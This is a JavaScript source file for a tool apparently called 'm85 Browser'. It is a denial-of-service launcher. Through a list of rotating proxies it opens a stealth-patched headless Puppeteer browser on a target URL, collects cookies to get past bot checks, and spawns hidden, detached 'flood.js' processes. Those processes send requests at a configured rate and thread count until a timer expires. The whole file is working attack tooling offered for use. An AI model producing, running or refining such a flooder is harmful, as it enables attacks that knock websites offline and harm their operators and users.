const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin
puppeteer.use(StealthPlugin());

// Configuration
const TIMEOUT = 30000; // 30 seconds

// Colors for logging
const colors = {
  reset: "\x1b[0m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  pink: "\x1b[35m",
};

function log(type, message) {
  const prefix = `${colors.cyan}[m85|Browser]${colors.reset}`;
  let color = colors.reset;
  let symbol = "ℒ";
  
  if (type === "error") { color = colors.red; symbol = "×"; }
  if (type === "success") { color = colors.green; symbol = "✓"; }
  if (type === "warn") { color = colors.yellow; symbol = "!"; }
  if (type === "info") { color = colors.cyan; symbol = "ℒ"; }
  if (type === "pink") { color = colors.pink; symbol = "★"; }
  
  console.log(`${prefix} ${color}${symbol} ${message}${colors.reset}`);
}

// Check command line arguments
if (process.argv.length < 7) {
  log("error", "Usage: node browser.js <url> <threads> <proxies.txt> <rate> <duration_seconds>");
  log("error", "Example: node browser.js https://example.com 5 proxies.txt 100 60");
  process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
let proxies = [];
try {
  const data = fs.readFileSync(proxyFile, 'utf8');
  proxies = data.trim().split(/\r?\n/).filter(p => p.trim());
  log("success", `Loaded ${proxies.length} proxies`);
} catch (error) {
  log("error", `Cannot read proxy file: ${error.message}`);
  process.exit(1);
}

if (proxies.length === 0) {
  log("error", "No proxies found in file");
  process.exit(1);
}

// Random user agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

function getRandomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ALWAYS spawn flood.js - even if proxy fails
async function openBrowserAndSpawn(proxy, id) {
  const userAgent = getRandomUA();
  let browser = null;
  let title = "Unknown";
  let cookieString = "";
  
  // Simple proxy formatting
  let proxyUrl = proxy.trim();
  proxyUrl = proxyUrl.replace(/^https?:\/\//, '');
  proxyUrl = `http://${proxyUrl}`;
  
  log("info", `[${id}] Processing proxy: ${proxy}`);
  
  try {
    // Try to launch browser (will continue even if it fails)
    const options = {
      headless: "new",
      ignoreHTTPSErrors: true,
      args: [
        `--proxy-server=${proxyUrl}`,
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        `--user-agent=${userAgent}`,
      ]
    };
    
    browser = await puppeteer.launch(options).catch(e => null);
    
    if (browser) {
      const pages = await browser.pages();
      const page = pages[0];
      page.setDefaultTimeout(TIMEOUT);
      page.setDefaultNavigationTimeout(TIMEOUT);
      
      // Try to navigate
      try {
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: TIMEOUT });
        title = await page.title();
        
        // Get cookies if possible
        const cookies = await page.cookies();
        cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        log("success", `[${id}] Browser loaded: ${title}`);
      } catch (navError) {
        log("warn", `[${id}] Navigation failed: ${navError.message}`);
        title = "Failed to load";
      }
      
      // Close browser
      await browser.close().catch(e => null);
    } else {
      log("warn", `[${id}] Browser launch failed, but spawning flood.js anyway`);
    }
    
  } catch (error) {
    log("error", `[${id}] Error: ${error.message}`);
  }
  
  // ALWAYS spawn flood.js - regardless of browser success
  if (cookieString === "") {
    cookieString = "no-cookies";
    log("warn", `[${id}] No cookies captured, using default`);
  }
  
  log("success", `[${id}] 🚀 Spawning flood.js with proxy: ${proxy}`);
  
  const floodArgs = [
    "flood.js",
    targetURL,
    "100",
    "2",
    proxy,
    rates,
    cookieString,
    userAgent
  ];
  
  // Spawn flood.js process
  const floodProcess = spawn("node", floodArgs, {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
  });
  
  floodProcess.unref();
  
  log("success", `[${id}] flood.js PID: ${floodProcess.pid}`);
  
  return {
    id: id,
    proxy: proxy,
    pid: floodProcess.pid,
    title: title
  };
}

// Cleanup function
function cleanup() {
  log("warn", "Cleaning up flood.js processes...");
  
  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec('taskkill /F /IM node.exe /FI "WINDOWTITLE eq flood.js"', () => {});
  } else {
    const { exec } = require('child_process');
    exec('pkill -f flood.js', () => {});
  }
}

// Main function
async function main() {
  log("info", `╔════════════════════════════════════════╗`);
  log("info", `║     m85 Browser with flood.js         ║`);
  log("info", `║     FORCING SPAWN - NO PROXY CHECK    ║`);
  log("info", `╚════════════════════════════════════════╝`);
  log("info", `Target: ${targetURL}`);
  log("info", `Threads: ${threads}`);
  log("info", `Rate: ${rates} req/sec`);
  log("info", `Duration: ${duration} seconds`);
  log("info", `Total proxies: ${proxies.length}`);
  
  // Check if flood.js exists
  if (!fs.existsSync("flood.js")) {
    log("error", "flood.js not found in current directory!");
    log("error", "Make sure flood.js exists before running this script");
    process.exit(1);
  }
  
  // Shuffle proxies for better distribution
  for (let i = proxies.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
  }
  
  // Set up cleanup on exit
  process.on('SIGINT', () => {
    log("warn", "\n⚠ Interrupt received, cleaning up...");
    cleanup();
    setTimeout(() => {
      log("success", "Goodbye!");
      process.exit(0);
    }, 2000);
  });
  
  // Create queue of proxies
  const proxyQueue = [...proxies];
  let activeThreads = 0;
  let spawned = 0;
  let failed = 0;
  
  // Process function
  async function processProxy(proxy, id) {
    activeThreads++;
    const result = await openBrowserAndSpawn(proxy, id);
    activeThreads--;
    spawned++;
    
    log("success", `[${id}] ✅ SPAWNED flood.js (${spawned}/${proxyQueue.length + proxies.length - proxyQueue.length})`);
    
    // Process next proxy if available
    if (proxyQueue.length > 0) {
      const nextProxy = proxyQueue.shift();
      if (nextProxy) {
        processProxy(nextProxy, id + threads);
      }
    }
  }
  
  // Start initial threads
  const startTime = Date.now();
  for (let i = 0; i < Math.min(threads, proxyQueue.length); i++) {
    const proxy = proxyQueue.shift();
    processProxy(proxy, i + 1);
  }
  
  // Wait for duration
  log("info", `⏱ Running for ${duration} seconds...`);
  
  const interval = setInterval(() => {
    const remaining = Math.ceil((startTime + (duration * 1000) - Date.now()) / 1000);
    if (remaining > 0 && remaining % 10 === 0) {
      log("info", `⏱ Time remaining: ${remaining} seconds | Spawned: ${spawned}`);
    }
  }, 10000);
  
  // Wait until duration expires
  while (Date.now() < startTime + (duration * 1000)) {
    await sleep(1000);
  }
  
  clearInterval(interval);
  
  // Stop and cleanup
  log("warn", "\n⏱ Time limit reached, stopping flood.js processes...");
  cleanup();
  
  // Wait for cleanup
  await sleep(3000);
  
  // Final statistics
  log("info", "\n╔════════════════════════════════════════╗");
  log("info", "║           FINAL RESULTS                ║");
  log("info", "╚════════════════════════════════════════╝");
  log("success", `✅ flood.js processes spawned: ${spawned}`);
  log("success", `📈 Spawn rate: ${((spawned / duration) * 60).toFixed(1)} per minute`);
  log("success", `🎯 Target: ${targetURL}`);
  log("success", `⚡ Rate: ${rates} requests/second per flood.js`);
  
  process.exit(0);
}

// Run main function
main().catch(error => {
  log("error", `Fatal error: ${error.message}`);
  process.exit(1);
});
